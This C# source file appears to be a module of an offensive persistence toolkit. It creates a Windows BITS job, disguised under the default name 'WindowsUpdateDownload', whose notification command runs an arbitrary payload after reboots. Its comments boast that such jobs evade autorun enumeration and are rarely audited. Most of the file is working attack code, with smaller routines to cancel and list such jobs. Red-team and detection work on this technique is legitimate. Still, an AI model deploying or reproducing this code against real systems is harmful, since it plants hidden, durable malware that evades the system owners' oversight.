using System;
using System.Collections.Generic;
using System.Diagnostics;
using Tendril.Core;

namespace Tendril.Modules
{
    /// <summary>
    /// BITS Job Persistence (T1197)
    ///
    /// Background Intelligent Transfer Service jobs survive reboots and re-fire
    /// notification commands on user logon. The job downloads a file (or fakes it)
    /// and runs a command on completion.
    ///
    /// Runs under SYSTEM context. BITS jobs are rarely audited and don't appear
    /// in standard autorun enumeration.
    /// </summary>
    public class BitsJobPersist : ITendril
    {
        public string Name { get { return "BitsJobPersist"; } }
        public string Description { get { return "BITS job notification command - survives reboots, runs as SYSTEM"; } }
        public string MitreId { get { return "T1197"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, jobName, downloadUrl;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<command_to_run>");
            if (!options.TryGetValue("name", out jobName))
                jobName = "WindowsUpdateDownload";
            if (!options.TryGetValue("url", out downloadUrl))
                downloadUrl = "https://www.microsoft.com/favicon.ico";

            try
            {
                // Create BITS job, set notification command, resume
                string destPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                                  @"\Microsoft\Windows\INetCache\" + jobName + ".tmp";

                RunBitsAdmin(string.Format("/create \"{0}\"", jobName));
                RunBitsAdmin(string.Format("/addfile \"{0}\" \"{1}\" \"{2}\"", jobName, downloadUrl, destPath));
                RunBitsAdmin(string.Format("/setnotifycmdline \"{0}\" \"{1}\" \"\"", jobName, payload));
                RunBitsAdmin(string.Format("/setnotifyflags \"{0}\" 1", jobName));
                RunBitsAdmin(string.Format("/setminretrydelay \"{0}\" 60", jobName));
                RunBitsAdmin(string.Format("/resume \"{0}\"", jobName));

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("BITS job created: {0}", jobName))
                    .WithMeta("JobName", jobName)
                    .WithMeta("NotifyCmd", payload)
                    .WithMeta("DownloadUrl", downloadUrl);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "BITS job creation failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string jobName;
            if (!options.TryGetValue("name", out jobName))
                jobName = "WindowsUpdateDownload";

            try
            {
                RunBitsAdmin(string.Format("/cancel \"{0}\"", jobName));
                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("BITS job cancelled: {0}", jobName));
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "BITS cancel failed: " + ex.Message);
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            try
            {
                string output = RunBitsAdmin("/list /allusers /verbose");
                if (!string.IsNullOrEmpty(output))
                {
                    // Parse for NOTIFICATION COMMAND LINE entries
                    string[] lines = output.Split('\n');
                    string currentJob = "";
                    foreach (string line in lines)
                    {
                        string trimmed = line.Trim();
                        if (trimmed.StartsWith("DISPLAY:"))
                            currentJob = trimmed.Substring(8).Trim();
                        if (trimmed.StartsWith("NOTIFICATION COMMAND LINE:") && trimmed.Length > 26)
                        {
                            string cmd = trimmed.Substring(25).Trim();
                            if (!string.IsNullOrEmpty(cmd) && cmd != "none")
                            {
                                results.Add(new TendrilResult(ResultStatus.Warning, Name,
                                    string.Format("BITS job with notify cmd: {0}", currentJob))
                                    .WithMeta("Job", currentJob)
                                    .WithMeta("NotifyCmd", cmd));
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                results.Add(new TendrilResult(ResultStatus.Failed, Name, "BITS enumeration failed: " + ex.Message));
            }
            return results;
        }

        private static string RunBitsAdmin(string args)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "bitsadmin.exe",
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            using (var proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit(10000);
                return output;
            }
        }
    }
}
